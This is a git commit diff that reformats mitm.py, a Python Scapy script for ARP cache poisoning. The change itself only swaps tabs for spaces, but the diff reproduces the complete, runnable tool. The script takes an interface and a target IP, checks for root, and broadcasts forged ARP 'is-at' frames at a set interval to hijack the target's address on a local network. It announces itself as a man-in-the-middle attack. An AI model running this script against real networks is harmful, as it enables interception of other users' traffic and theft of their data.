85c3948978c0f6121e9f8bd770385faa86e053fa
Paul-Emmanuel Raoul <skyper@skyplabs.net>
2018-01-12 11:58:24 +0000

    replace tab characters with spaces

--- mitm.py
+++ mitm.py
@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-	 ARP cache poisoning implementation using Scapy
+ARP cache poisoning implementation using Scapy.
 """
 
 from argparse import ArgumentParser
@@ -12,27 +12,29 @@ from sys import exit
 from time import sleep
 
 def arp_mitm(interface, target, interval=10.0):
-	"""ARP cache poisoning attack"""
+    """
+    ARP cache poisoning attack.
+    """
 
-	myMAC = get_if_hwaddr(interface)
-	while 1:
-		sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=target, hwsrc=myMAC))
-		sleep(interval)
+    myMAC = get_if_hwaddr(interface)
+    while 1:
+        sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=target, hwsrc=myMAC))
+        sleep(interval)
 
 if __name__ == "__main__":
-	ap = ArgumentParser(description="ARP cache poisoning implementation using Scapy")
-	ap.add_argument("-i", "--interface", required=True, help="network interface to use")
-	ap.add_argument("-t", "--target", required=True, help="target's IP address")
-	ap.add_argument("-I", "--interval", type=float, default=10.0, help="seconds between two ARP frames (default: 10.0s)")
-	args = vars(ap.parse_args())
+    ap = ArgumentParser(description="ARP cache poisoning implementation using Scapy")
+    ap.add_argument("-i", "--interface", required=True, help="network interface to use")
+    ap.add_argument("-t", "--target", required=True, help="target's IP address")
+    ap.add_argument("-I", "--interval", type=float, default=10.0, help="seconds between two ARP frames (default: 10.0s)")
+    args = vars(ap.parse_args())
 
-	if not geteuid() == 0:
-		exit("[!] You must be root")
+    if not geteuid() == 0:
+        exit("[!] You must be root")
 
-	try:
-		print("[*] Starting ARP MITM attack ...")
-		arp_mitm(args["interface"], args["target"], args["interval"])
-	except IOError:
-		exit("[!] Interface doesn't exist")
-	except KeyboardInterrupt:
-		print("\n[*] Stopping ARP MITM attack")
+    try:
+        print("[*] Starting the ARP MITM attack...")
+        arp_mitm(args["interface"], args["target"], args["interval"])
+    except IOError:
+        exit("[!] Interface doesn't exist")
+    except KeyboardInterrupt:
+        print("\n[*] Stopping the ARP MITM attack")
